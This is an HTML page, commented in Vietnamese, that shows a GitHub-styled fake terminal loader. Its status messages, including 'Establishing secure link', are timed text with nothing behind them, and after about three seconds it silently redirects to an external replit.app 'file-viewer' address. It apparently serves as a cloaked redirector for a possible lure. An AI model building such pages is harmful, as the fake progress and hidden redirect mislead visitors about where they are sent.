<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            background-color: #0e1117; /* Màu nền tối của GitHub */
            color: #c9d1d9; /* Màu chữ xám trắng nhẹ */
            font-family: 'SFMono-Regular', Consolas, monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .terminal-loader {
            width: 300px;
        }

        .status-text {
            font-size: 14px;
            margin-bottom: 10px;
            display: block;
        }

        /* Thanh tiến trình bằng ký tự */
        .progress-bar {
            letter-spacing: 2px;
            font-size: 12px;
            color: #58a6ff; /* Màu xanh đặc trưng */
        }

        .cursor {
            display: inline-block;
            width: 8px;
            height: 15px;
            background: #58a6ff;
            animation: blink 0.8s infinite;
            margin-left: 5px;
            vertical-align: middle;
        }

        @keyframes blink {
            50% { opacity: 0; }
        }

        /* Hiệu ứng mờ dần khi hoàn tất */
        .fade-out {
            opacity: 0;
            transition: opacity 0.5s ease;
        }
    </style>
</head>
<body>

    <div class="terminal-loader" id="loader">
        <span class="status-text" id="status">Connecting to server...</span>
        <div class="progress-bar" id="progress">[..........]</div>
    </div>

    <script>
        const REDIRECT_URL = "https://file-viewer--gog45397.replit.app";
        const progressEl = document.getElementById('progress');
        const statusEl = document.getElementById('status');
        const loaderEl = document.getElementById('loader');
        
        let percent = 0;
        const barLength = 10;

        // Giả lập thanh tải dữ liệu
        const interval = setInterval(() => {
            percent++;
            const filled = Math.floor((percent / 100) * barLength);
            const empty = barLength - filled;
            
            progressEl.innerHTML = `[${'#'.repeat(filled)}${'.'.repeat(empty)}] ${percent}%`;

            if (percent === 30) statusEl.innerText = "Fetching data...";
            if (percent === 70) statusEl.innerText = "Establishing secure link...";
            if (percent === 90) statusEl.innerText = "Redirecting...";

            if (percent >= 100) {
                clearInterval(interval);
                loaderEl.classList.add('fade-out'); // Hiệu ứng mờ dần trước khi đi
                setTimeout(() => {
                    window.location.replace(REDIRECT_URL);
                }, 300);
            }
        }, 30); // Tốc độ chạy (30ms * 100 = 3 giây tổng cộng)
    </script>
</body>
</html>
